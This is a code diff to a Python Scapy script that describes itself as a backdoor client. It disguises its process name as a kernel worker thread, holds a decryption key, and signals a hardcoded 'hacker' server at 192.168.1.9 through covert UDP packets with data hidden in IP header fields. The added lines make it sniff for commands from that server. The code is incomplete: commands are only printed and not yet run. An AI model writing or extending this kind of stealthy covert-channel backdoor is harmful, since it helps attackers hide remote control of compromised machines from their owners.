@@ -20,6 +20,8 @@ import sys
 import string
 from setproctitle import getproctitle, setproctitle
 
+
+WAITING = 1
 KEY = "runningman"	# used for decryption
 serv_addr = "192.168.1.9"	# hacker waits for client to run the program
 
@@ -33,14 +35,30 @@ def change_proc():
 	else:
 		setproctitle("%s" % "[kworker/2:3><><><><><><]")
 
-def main():
 
+
+def recv_packet(pkt):
+	print pkt[TCP].id 
+
+
+def main():
+	global WAITING
 	# 0. when this program is run, change the process name
 	change_proc()
 	
 	# 1. send initial packet that backdoor client program is run to server
 	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start')
 	
+	# 2. wait for command from backdoor server (sniffing)
+	while True:
+		if WAITING == 1:
+			print "Waiting for command ..."
+			sniff(filter="udp and dst port 80 and src port 123", prn=recv_packet, count=1)
+			WAITING = 0
+			continue
+		else: 		# WAITING = 0
+			WAITING = 1
+			continue
 
 	
 
